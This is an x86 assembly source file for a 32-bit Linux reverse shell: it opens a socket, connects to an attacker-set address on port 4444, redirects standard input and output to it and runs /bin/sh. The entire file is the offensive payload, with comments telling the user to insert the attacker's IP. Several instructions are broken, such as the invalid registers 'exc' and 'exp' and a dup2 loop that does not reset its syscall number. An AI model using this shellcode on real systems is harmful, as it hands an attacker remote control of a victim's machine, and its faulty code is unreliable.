section .data
    ip_address: db 192, 168, 1, 100 ;change to your ip (attacker)
    port dw 0x5c11 ;4444 for now, use a network byte converter to change

section .text
    global _start

_start:
    ;create socket
    xor eax, eax                ;clear eax register
    push eax                    ;push protocol 0
    push byte 0x1               ;push SOCK_STREAM (1)
    push byte 0x2               ;push AF_INET (2)
    mov al, 0x66                ;syscall for socketcall (0x66)
    mov bl, 0x1                 ;socket() (first function 0x1)
    mov exc, exp                ;pointer to [AF_INET, SOCK_STREAM, 0]
    int 0x80                    ;perform syscall (socket)

    xchg eax, ebx

    ;create sockaddr_in struct (connect to ip and ports)
    push eax                    ;null terminator
    push dword [ip_address]     ;ip address
    push word [port]            ;port
    push word 0x2               ;AF_INET
    mov ecx, esp                ;pointer to sockaddr_in struct

    ;connect socket
    push 0x10                   ;size of sockaddr_in (16 bytes = 0x10)
    push exc                    ;pointer to sockaddr_in
    push ebx                    ;socket file descriptor
    mov al, 0x66                ;syscall for socketcall (0x66)
    mov bl, 0x3                 ;connect() (third function 0x3)
    mov ecx, esp                ;pointer to args [sock, sockaddr_in, size]
    int 0x80

    ;duplicate socket to stdin, stdout, and stderr
    mov al, 0x3f                ;syscall for dup2 (0x3f)
    xor ecx, ecx                ;clear ecx (ECX=0)
dup_loop:
    int 0x80                    ;do dup2 syscall
    inc ecx                     ;++ECX
    cmp ecx, 3                  ;do for all pipes (stdin, stdout, stderr)
    jl dup_loop                 ;jump if less than

    ;execve /bin/sh (execve("bin/sh", NULL, NULL))
    xor eax, eax
    push eax                    ;clear eax
    push 0x68732f6e             ;push '/sh' string in reverse
    push 0x69622f2f             ;push '/bin' string in reverse
    mov ebx, esp                ;EBX points to "/bin/sh"
    push eax                    ;push NULL (argv)
    push ebx                    ;push pointer to "/bin/sh" (argv[0])
    mov ecx, esp                ;ECX = pointer to argv
    xor edx, edx                ;EDX = NULL (envp)
    mov al, 0xb                 ;syscall for execv (0xb)
    int 0x80                    ;perform execv syscall

